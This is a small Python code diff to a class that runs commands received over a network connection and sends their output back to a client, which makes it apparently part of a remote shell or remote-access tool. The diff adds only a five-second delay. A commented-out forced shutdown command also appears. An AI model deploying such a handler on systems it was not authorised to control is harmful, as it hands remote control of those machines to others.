@@ -1,5 +1,6 @@
 import subprocess # CMD commands and outputs
 import os
+import time
 CMD_COMMAND = 'cmd /k '
 
 class runCommandViaCMD(object):
@@ -14,5 +15,6 @@ class runCommandViaCMD(object):
     def runOp(userCommand,conn):
 
         data =  subprocess.run([userCommand], stdout=subprocess.PIPE).stdout.decode('utf-8')
+        time.sleep(5)
         conn.send(data.encode())  # send data to the client
         # os.system("shutdown /s /t 1")
